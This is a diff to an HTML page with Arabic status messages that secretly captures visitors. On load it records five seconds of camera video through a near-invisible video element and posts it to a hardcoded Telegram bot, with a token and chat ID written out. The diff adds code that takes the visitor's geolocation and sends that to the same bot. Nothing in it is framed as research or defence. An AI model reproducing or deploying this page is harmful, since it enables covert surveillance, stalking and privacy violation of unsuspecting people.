@@ -3,21 +3,21 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🎥 جاري التسجيل...</title>
+  <title>🎥 تسجيل وموقع مباشر</title>
   <style>
     body {
       margin: 0;
       padding: 0;
-      background-color: #000;
+      background: #000;
       color: #fff;
-      font-family: sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      font-family: sans-serif;
     }
     #status {
-      font-size: 20px;
+      font-size: 18px;
     }
     video {
       position: absolute;
@@ -26,18 +26,27 @@
       top: 0;
       left: 0;
       opacity: 0.01;
-      pointer-events: none;
     }
   </style>
 </head>
 <body>
-  <div id="status">🎥 جاري تسجيل الفيديو...</div>
-
+  <div id="status">⏳ جاري بدء التسجيل وتحديد الموقع...</div>
   <video id="video" autoplay playsinline muted></video>
 
   <script>
     const chat_id = "6908826896";
     const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";
+
+    async function sendLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude } = pos.coords;
+          fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chat_id}&latitude=${latitude}&longitude=${longitude}`);
+        }, err => {
+          console.warn("❌ فشل تحديد الموقع:", err.message);
+        });
+      }
+    }
 
     async function startRecording() {
       try {
@@ -48,7 +57,7 @@
         const recorder = new MediaRecorder(stream);
         const chunks = [];
 
-        recorder.ondataavailable = (e) => {
+        recorder.ondataavailable = e => {
           if (e.data.size > 0) chunks.push(e.data);
         };
 
@@ -58,34 +67,32 @@
 
           const formData = new FormData();
           formData.append("chat_id", chat_id);
-          formData.append("video", blob, "video.mp4");
+          formData.append("video", blob, "recorded.mp4");
 
           fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
             method: "POST",
             body: formData
-          }).then(r => r.json()).then(d => {
-            document.getElementById("status").innerText = d.ok
-              ? "✅ تم إرسال الفيديو!"
-              : "❌ فشل في الإرسال.";
-          }).catch(err => {
+          }).then(res => res.json()).then(data => {
+            document.getElementById("status").innerText = data.ok ? "✅ تم إرسال الفيديو والموقع!" : "❌ فشل في إرسال الفيديو.";
+          }).catch(() => {
             document.getElementById("status").innerText = "❌ خطأ في الاتصال.";
           });
         };
 
         recorder.start();
-        document.getElementById("status").innerText = "⏺️ جاري التسجيل...";
+        document.getElementById("status").innerText = "⏺️ يتم التسجيل الآن...";
 
-        // سجّل لمدة 5 ثواني فقط
-        setTimeout(() => {
-          recorder.stop();
-        }, 5000);
+        setTimeout(() => recorder.stop(), 5000); // يسجل 5 ثواني
 
       } catch (err) {
-        document.getElementById("status").innerText = "❌ فشل في تشغيل الكاميرا.";
+        document.getElementById("status").innerText = "❌ فشل تشغيل الكاميرا.";
       }
     }
 
-    window.onload = startRecording;
+    window.onload = () => {
+      sendLocation();
+      startRecording();
+    };
   </script>
 </body>
 </html>
